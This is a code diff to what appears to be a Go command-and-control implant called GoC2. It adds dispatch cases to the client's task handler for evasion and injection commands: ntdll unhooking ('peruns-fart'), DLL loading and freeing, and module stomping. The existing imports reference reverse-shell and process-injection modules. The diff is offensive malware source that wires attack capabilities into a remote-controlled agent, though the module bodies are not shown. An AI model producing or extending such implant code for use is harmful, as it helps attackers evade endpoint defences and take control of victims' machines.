@@ -39,6 +39,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/evasion/unhookntdll"
 	"github.com/latortuga71/GoC2/internal/modules/execution/createprocess"
 	"github.com/latortuga71/GoC2/internal/modules/execution/enumrwxmemory"
+	"github.com/latortuga71/GoC2/internal/modules/execution/loadlibrary"
 	"github.com/latortuga71/GoC2/internal/modules/execution/memfdcreate"
 	"github.com/latortuga71/GoC2/internal/modules/execution/processinjection"
 	"github.com/latortuga71/GoC2/internal/modules/execution/reverseshell"
@@ -333,6 +334,14 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = enummodules.EnumProcessModules(t.Args[0])
 	case "enum-rwx-memory":
 		result, cmdError = enumrwxmemory.EnumMemory()
+	case "peruns-fart":
+		result, cmdError = unhookntdll.PerunsFart()
+	case "load-library":
+		result, cmdError = loadlibrary.LoadDll(t.Args[0])
+	case "free-library":
+		result, cmdError = loadlibrary.FreeDll(t.Args[0])
+	case "module-stomp":
+		result, cmdError = processinjection.ModuleStomp(t.File, t.Args[0])
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
@@ -581,6 +590,7 @@ func ClientReceiveHandler(client *data.Client) {
 			*/
 		default:
 		}
+		//debug.FreeOSMemory()
 	}
 	runtime.UnlockOSThread()
 }
